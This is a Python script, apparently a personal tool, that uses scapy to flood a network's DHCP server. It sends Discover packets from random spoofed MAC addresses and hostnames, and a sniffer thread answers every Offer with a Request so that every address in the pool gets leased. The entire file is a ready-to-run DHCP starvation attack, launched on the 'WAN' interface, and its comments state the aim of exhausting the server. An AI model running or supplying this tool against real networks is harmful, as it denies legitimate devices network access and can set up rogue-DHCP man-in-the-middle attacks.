#/usr/bin/python

# Dao Xuan Hung
# 16/08/2018 13:25

from scapy.all import *
import threading, time, datetime, socket, binascii

def randomMAC():
    mac = [ 0xDE, 0xAD, 
        random.randint(0x00, 0x29),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def unpackMAC(binmac):
    mac = binascii.hexlify(binmac, ':')[0:17]
    return mac

def seconds_diff(dt2, dt1):
    # from https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
    timedelta = dt2 - dt1
    return timedelta.days * 24 * 3600 + timedelta.seconds

def randomHostname(length):
    # and this from me :))
    hostname = ''
    for i in range (length):
        num = random.randint(97, 122)
        hostname += chr(num)
    return hostname



class DHCPSniffer(threading.Thread):
    def __init__(self, iface):
        super(DHCPSniffer, self).__init__()
        self.iface = iface
        self.socket = None
        self.daemon = True
        self.stop_sniffer = threading.Event()

    def run(self):
        filter_options = 'udp and src port 67 and dst port 68'

        self.socket = conf.L2listen(
                                    type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DHCPSniffer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (DHCP in packet):
            if (packet[DHCP] and packet[DHCP].options[0][1] == 2): # if DHCP Offer
                ip = packet[BOOTP].yiaddr
                serverip = packet[DHCP].options[1][1] # packet[BOOTP].siaddr always 0.0.0.0, i don't know why
                tranid = packet[BOOTP].xid
                srcmac = unpackMAC(packet[BOOTP].chaddr)

                # create DHCP request
                request = DHCPRequestClient(self.iface, srcmac, ip, serverip, tranid)
                request.run()
                del request

            if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP ACK
                ip = packet[BOOTP].yiaddr
                print ("Got IP address: " + ip)


class DHCPRequestClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, iface, srcmac, ip, serverip, tranid):
        self.iface  = iface
        self.srcmac = srcmac
        self.ip     = ip
        self.serverip = serverip
        self.tranid = tranid
        self.hostname = randomHostname(random.randint(6, 10))

    def run(self):
        global last_response_time
        # when this method run, it means DHCP server has just offered us new IP address
        last_response_time = datetime.datetime.now()
        self.Request()

    def Request(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = self.tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'request'),
                        ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('server_id', self.serverip),
                        ('requested_addr', self.ip),
                        ('server_id', self.serverip),
                        ('hostname', self.hostname),
                        ('end')]
        dhcprequest= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcprequest

        sendp(packet, iface=self.iface, verbose=False)



class DHCPDiscoverClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, srcmac, iface):
        self.srcmac = srcmac
        self.hostname = randomHostname(random.randint(6, 10))
        self.iface = iface

    def run(self):
        self.Discover()

    def Discover(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = random.randint(0x1000, 0x5000), # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'discover'),
                        ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('hostname', self.hostname),
                        ('end') ]
        dhcpdiscover= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpdiscover

        sendp(packet, iface=self.iface, verbose=False)


def floodDHCPServer(iface):
    sniffer = None
    try:
        # Send DHCPDiscover continually
        # Sniffer receives OFFER packets, and create a DHCPRequest to receive ACK

        sniffer = DHCPSniffer(iface)
        sniffer.start()
        while(True):
            # send DHCP Discover
            discover = DHCPDiscoverClient(randomMAC(), iface)
            discover.run()
            del discover

            time.sleep(1)

            current_time = datetime.datetime.now()
            # if we hadn't received any offer in 10 seconds, it means DHCP server had been exhausted
            #if (seconds_diff(current_time, last_response_time) > 10):
            #    # stop sniffer
            #    sniffer.join(2)
            #    del sniffer
            #    break
    except KeyboardInterrupt:
        sniffer.join(2)
        del sniffer


# variables
last_response_time = datetime.datetime.now()



floodDHCPServer('WAN')
print ("Done")

exit()